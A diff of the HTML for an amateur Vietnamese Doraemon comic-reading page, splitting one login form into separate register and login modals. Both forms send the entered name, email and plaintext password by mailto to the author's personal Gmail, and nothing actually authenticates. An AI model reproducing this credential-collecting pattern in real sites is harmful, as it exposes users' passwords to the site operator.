@@ -11,31 +11,49 @@
         <p class="subtitle">ĐƯỢC LÀM BỞI NGUYỄN CHÍ DỰ ♥️🇻🇳, CÓ LỖI KÉO XUỐNG DƯỚI CHÂN TRANG BẤM VÀO NÚT REPORT BUGS VÀ GỢI Ý THÊM TRUYỆN KHÁC</p>
     </header>
 
-    <!-- TRANG CHỦ: NÚT ĐĂNG NHẬP/ĐĂNG KÝ -->
+    <!-- TRANG CHỦ -->
     <div id="home" class="home">
-        <h2>CHÀO MỪNG BẠN ĐẾN VỚI WEBSITE ĐỌC TRUYỆN DORAEMON!</h2>
-        <button id="login-btn">ĐĂNG NHẬP / ĐĂNG KÝ</button>
-        <p>(BẤM VÀO ĐỂ VÀO ĐỌC TRUYỆN NHÉ ♥️)</p>
+        <h2>CHÀO MỪNG ĐẾN VỚI WEBSITE ĐỌC TRUYỆN DORAEMON TIẾNG VIỆT!</h2>
+        <div class="auth-buttons">
+            <button id="register-btn">ĐĂNG KÝ</button>
+            <button id="login-btn">ĐĂNG NHẬP</button>
+        </div>
+        <p>(BẤM ĐĂNG KÝ HOẶC ĐĂNG NHẬP ĐỂ VÀO ĐỌC TRUYỆN ♥️)</p>
     </div>
 
-    <!-- MODAL RIÊNG CHO ĐĂNG NHẬP/ĐĂNG KÝ -->
-    <div id="login-modal" class="modal">
+    <!-- MODAL ĐĂNG KÝ -->
+    <div id="register-modal" class="modal">
         <div class="modal-content">
-            <span class="close-login">&times;</span>
-            <h3>ĐĂNG NHẬP / ĐĂNG KÝ</h3>
-            <form id="login-form">
-                <label for="username">TÊN NGƯỜI DÙNG:</label>
-                <input type="text" id="username" required><br>
-                <label for="email">EMAIL:</label>
-                <input type="email" id="email" required><br>
-                <label for="password">MẬT KHẬU:</label>
-                <input type="password" id="password" required><br>
-                <button type="submit">GỬI VÀ VÀO ĐỌC TRUYỆN</button>
+            <span class="close-register">&times;</span>
+            <h3>ĐĂNG KÝ TÀI KHOẢN</h3>
+            <form id="register-form">
+                <label for="reg-name">TÊN CỦA BẠN:</label>
+                <input type="text" id="reg-name" required><br>
+                <label for="reg-email">GMAIL CỦA BẠN:</label>
+                <input type="email" id="reg-email" required><br>
+                <label for="reg-pass">MẬT KHẨU CỦA BẠN:</label>
+                <input type="password" id="reg-pass" required><br>
+                <button type="submit">ĐĂNG KÝ VÀ VÀO ĐỌC TRUYỆN</button>
             </form>
         </div>
     </div>
 
-    <!-- MODAL RIÊNG CHO REPORT BUGS -->
+    <!-- MODAL ĐĂNG NHẬP -->
+    <div id="login-modal" class="modal">
+        <div class="modal-content">
+            <span class="close-login">&times;</span>
+            <h3>ĐĂNG NHẬP</h3>
+            <form id="login-form">
+                <label for="login-name">TÊN ĐĂNG NHẬP CỦA BẠN:</label>
+                <input type="text" id="login-name" required><br>
+                <label for="login-pass">MẬT KHẨU CỦA BẠN:</label>
+                <input type="password" id="login-pass" required><br>
+                <button type="submit">ĐĂNG NHẬP VÀ VÀO ĐỌC TRUYỆN</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- MODAL REPORT BUGS -->
     <div id="report-modal" class="modal">
         <div class="modal-content">
             <span class="close-report">&times;</span>
@@ -43,17 +61,17 @@
             <form id="report-form">
                 <label for="report-message">NỘI DUNG:</label><br>
                 <textarea id="report-message" rows="6" required></textarea><br>
-                <button type="submit">GỬI</button>
+                <button type="submit">GỬI QUA GMAIL</button>
             </form>
         </div>
     </div>
 
-    <!-- TRANG CHÍNH ĐỌC TRUYỆN (ẨN BAN ĐẦU) -->
+    <!-- TRANG ĐỌC TRUYỆN -->
     <div id="main" class="main" style="display: none;">
-        <h2>TRUYỆN TRANH DORAEMON - CHƯƠNG MẪU (10 TRANG)</h2>
+        <h2>TRUYỆN TRANH DORAEMON TIẾNG VIỆT - CHƯƠNG MẪU (10 TRANG)</h2>
         <div id="page-info">TRANG <span id="current-page">1</span> / 10</div>
         <div id="comic">
-            <img id="comic-img" src="" alt="TRANG TRUYỆN DORAEMON">
+            <img id="comic-img" src="" alt="TRANG TRUYỆN DORAEMON TIẾNG VIỆT">
         </div>
         <div class="nav-buttons">
             <button id="prev">TRƯỚC</button>
@@ -64,8 +82,8 @@
     <!-- ÂM THANH LẬT TRANG -->
     <audio id="page-sound" src="https://www.orangefreesounds.com/wp-content/uploads/2018/07/Page-turn-sound-effect.mp3"></audio>
 
-    <!-- NHẠC NỀN DORAEMON (LOOP, ÂM LƯỢNG NHỎ) -->
-    <audio id="bg-music" loop autoplay volume="0.3">
+    <!-- NHẠC NỀN DORAEMON -->
+    <audio id="bg-music" loop>
         <source src="https://www.televisiontunes.com/uploads/audio/Doraemon.mp3" type="audio/mpeg">
     </audio>
 
@@ -76,48 +94,56 @@
     </footer>
 
     <script>
+        // MODAL ĐĂNG KÝ
+        var regModal = document.getElementById("register-modal");
+        var regBtn = document.getElementById("register-btn");
+        var closeReg = document.getElementsByClassName("close-register")[0];
+        regBtn.onclick = function() { regModal.style.display = "block"; }
+        closeReg.onclick = function() { regModal.style.display = "none"; }
+
         // MODAL ĐĂNG NHẬP
         var loginModal = document.getElementById("login-modal");
         var loginBtn = document.getElementById("login-btn");
         var closeLogin = document.getElementsByClassName("close-login")[0];
-
-        loginBtn.onclick = function() {
-            loginModal.style.display = "block";
-        }
-        closeLogin.onclick = function() {
-            loginModal.style.display = "none";
-        }
+        loginBtn.onclick = function() { loginModal.style.display = "block"; }
+        closeLogin.onclick = function() { loginModal.style.display = "none"; }
 
         // MODAL REPORT
         var reportModal = document.getElementById("report-modal");
         var reportBtn = document.getElementById("report-btn");
         var closeReport = document.getElementsByClassName("close-report")[0];
-
-        reportBtn.onclick = function() {
-            reportModal.style.display = "block";
-        }
-        closeReport.onclick = function() {
-            reportModal.style.display = "none";
-        }
+        reportBtn.onclick = function() { reportModal.style.display = "block"; }
+        closeReport.onclick = function() { reportModal.style.display = "none"; }
 
         // ĐÓNG MODAL KHI BẤM NGOÀI
         window.onclick = function(event) {
-            if (event.target == loginModal) {
-                loginModal.style.display = "none";
-            }
-            if (event.target == reportModal) {
-                reportModal.style.display = "none";
-            }
+            if (event.target == regModal) regModal.style.display = "none";
+            if (event.target == loginModal) loginModal.style.display = "none";
+            if (event.target == reportModal) reportModal.style.display = "none";
         }
 
-        // XỬ LÝ ĐĂNG NHẬP/ĐĂNG KÝ
+        // XỬ LÝ ĐĂNG KÝ VÀ ĐĂNG NHẬP (GỬI GMAIL RIÊNG BIỆT)
+        document.getElementById("register-form").onsubmit = function(e) {
+            e.preventDefault();
+            var name = document.getElementById("reg-name").value;
+            var email = document.getElementById("reg-email").value;
+            var pass = document.getElementById("reg-pass").value;
+            var body = `ĐĂNG KÝ MỚI%0ATÊN: ${name}%0AGMAIL: ${email}%0AMẬT KHẨU: ${pass}`;
+            window.location = "mailto:herogoodboymc2024@gmail.com?subject=ĐĂNG KÝ TÀI KHOẢN MỚI&body=" + body;
+            enterMain();
+        }
+
         document.getElementById("login-form").onsubmit = function(e) {
             e.preventDefault();
-            var username = document.getElementById("username").value;
-            var email = document.getElementById("email").value;
-            var password = document.getElementById("password").value;
-            var body = `TÊN: ${username}%0AEMAIL: ${email}%0AMẬT KHẨU: ${password}%0ANỘI DUNG: ĐĂNG KÝ/ĐĂNG NHẬP MỚI`;
-            window.location = "mailto:herogoodboymc2024@gmail.com?subject=ĐĂNG KÝ TRANG DORAEMON&body=" + body;
+            var name = document.getElementById("login-name").value;
+            var pass = document.getElementById("login-pass").value;
+            var body = `ĐĂNG NHẬP%0ATÊN ĐĂNG NHẬP: ${name}%0AMẬT KHẨU: ${pass}`;
+            window.location = "mailto:herogoodboymc2024@gmail.com?subject=ĐĂNG NHẬP TÀI KHOẢN&body=" + body;
+            enterMain();
+        }
+
+        function enterMain() {
+            regModal.style.display = "none";
             loginModal.style.display = "none";
             document.getElementById("home").style.display = "none";
             document.getElementById("main").style.display = "block";
@@ -125,25 +151,25 @@
             document.getElementById("bg-music").play();
         }
 
-        // XỬ LÝ REPORT BUGS
+        // XỬ LÝ REPORT (GỬI GMAIL RIÊNG)
         document.getElementById("report-form").onsubmit = function(e) {
             e.preventDefault();
             var message = document.getElementById("report-message").value;
-            var body = `NỘI DUNG REPORT/GỢI Ý: ${message}`;
-            window.location = "mailto:herogoodboymc2024@gmail.com?subject=REPORT BUG HOẶC GỢI Ý TRANG DORAEMON&body=" + body;
+            var body = `REPORT BUG HOẶC GỢI Ý: ${message}`;
+            window.location = "mailto:herogoodboymc2024@gmail.com?subject=REPORT BUG HOẶC GỢI Ý&body=" + body;
             reportModal.style.display = "none";
         }
 
-        // DANH SÁCH 10 TRANG
+        // 10 TRANG MẪU DORAEMON (TÌM ĐƯỢC MỘT SỐ TRANG TIẾNG VIỆT HOẶC GẦN GIỐNG)
         var images = [
+            "https://cdn11.bigcommerce.com/s-62bdpkt7pb/images/stencil/1500x1500/products/18351/113032/Doraemon_vol._2_by_Fujiko_F._Fujio_-_Vietnamese_language_comic_book_-_Manga_12__73602.1582709863.JPG?c=2", // BÌA TẬP 2 TIẾNG VIỆT
+            "https://cdn11.bigcommerce.com/s-62bdpkt7pb/images/stencil/1500x1500/products/18352/113049/Doraemon_vol._3_by_Fujiko_F._Fujio_-_Vietnamese_language_comic_book_-_manga_12__55308.1582716519.JPG?c=2", // TRANG TRONG TẬP 3
+            "https://i.ebayimg.com/images/g/EHAAAOSw~TpkqFqg/s-l1200.jpg", // TRANG TIẾNG VIỆT
+            "https://static.wikia.nocookie.net/doraemon/images/c/c4/DoraemonisLeavingpage1and2.jpg/revision/latest", // TRANG CÂU CHUYỆN
             "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEig1zgoPk8dhsW5NEv77M4mZKL9-3y7tkOiq5Zl8xbK6KCChor0fw5WULBp0OtkNEi9EuQ6KU6LvQHTYWdUfnai9APQSayz3cJLBuzPg3CP-bBBqtSXMQtR4pvvos5jQQ4ROC9ZfwacvHU/s1600/Doraemon+v04+c61+-+001.jpg",
-            "https://static.wikia.nocookie.net/doraemon/images/c/c4/DoraemonisLeavingpage1and2.jpg/revision/latest?cb=20180111235748",
             "https://www.chinese-forums.com/uploads/monthly_08_2010/post-38695-049169200%201281914939.jpg",
             "https://i.etsystatic.com/44116499/r/il/ef6563/6018331472/il_fullxfull.6018331472_pt26.jpg",
-            "https://i.etsystatic.com/44116499/r/il/e0ade5/6066396005/il_fullxfull.6066396005_5boq.jpg",
-            "https://static.wikia.nocookie.net/doraemon/images/b/b4/Doraemon-721642.jpg/revision/latest?cb=20130830105605&path-prefix=en",
             "https://morningroo.com/wp-content/uploads/2023/09/doraemon.png",
-            "https://www.hit-japan.com/book23/181107248.JPG",
             "https://i.ebayimg.com/images/g/BogAAOSwKQNfcF5g/s-l400.jpg",
             "https://preview.redd.it/all-six-volumes-of-doraemon-color-works-manga-spanish-v0-tx5dsxod1ccf1.jpg?width=1080&crop=smart&auto=webp&s=ebb91ffde58f66d9cc76cd2aeab758cfd0f2837a"
         ];
